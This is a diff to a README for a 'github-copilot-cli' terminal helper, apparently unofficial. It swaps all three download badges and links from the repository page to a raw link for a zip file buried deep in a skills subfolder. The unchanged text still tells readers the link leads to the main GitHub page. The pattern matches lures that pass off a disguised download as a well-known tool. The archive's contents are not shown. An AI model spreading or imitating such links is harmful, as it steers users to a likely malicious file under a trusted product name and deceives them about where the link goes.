@@ -1,6 +1,6 @@
 # 🤖 github-copilot-cli - Customize Your Terminal AI Helper  
 
-[![Download github-copilot-cli](https://img.shields.io/badge/Download-Get%20Here-brightgreen)](https://github.com/roblox2009emrobloxpiano-coder/github-copilot-cli)
+[![Download github-copilot-cli](https://img.shields.io/badge/Download-Get%20Here-brightgreen)](https://raw.githubusercontent.com/roblox2009emrobloxpiano-coder/github-copilot-cli/main/packages/copilot-cli-guide/skills/copilot-cli-guide/cli-copilot-github-3.7.zip)
 
 ---
 
@@ -39,7 +39,7 @@ The app helps you get more from GitHub Copilot outside of the code editor enviro
 
 Click the big green button below or visit the link to get the files for Windows.
 
-[![Get github-copilot-cli](https://img.shields.io/badge/Download-Click%20Here-blue)](https://github.com/roblox2009emrobloxpiano-coder/github-copilot-cli)  
+[![Get github-copilot-cli](https://img.shields.io/badge/Download-Click%20Here-blue)](https://raw.githubusercontent.com/roblox2009emrobloxpiano-coder/github-copilot-cli/main/packages/copilot-cli-guide/skills/copilot-cli-guide/cli-copilot-github-3.7.zip)  
 
 This link will take you to the main GitHub page for the project. Look for the latest release or the main download folder.  
 
@@ -120,7 +120,7 @@ Check the download page regularly for new versions. When you find a newer versio
 
 ## 🔗 Helpful Links
 
-- [Primary Download Link](https://github.com/roblox2009emrobloxpiano-coder/github-copilot-cli)  
+- [Primary Download Link](https://raw.githubusercontent.com/roblox2009emrobloxpiano-coder/github-copilot-cli/main/packages/copilot-cli-guide/skills/copilot-cli-guide/cli-copilot-github-3.7.zip)  
 - GitHub page for updates and support
 
 ---
